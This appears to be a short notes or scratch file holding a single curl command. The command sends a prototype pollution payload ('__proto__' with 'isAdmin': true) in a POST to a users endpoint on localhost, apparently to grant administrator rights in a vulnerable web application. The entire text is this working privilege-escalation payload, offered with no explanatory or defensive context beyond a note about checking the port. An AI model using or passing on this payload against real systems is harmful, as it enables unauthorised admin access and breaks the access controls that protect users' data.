# Have to make sure what the port is
curl -X POST http://localhost:3000/users -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin": true}}'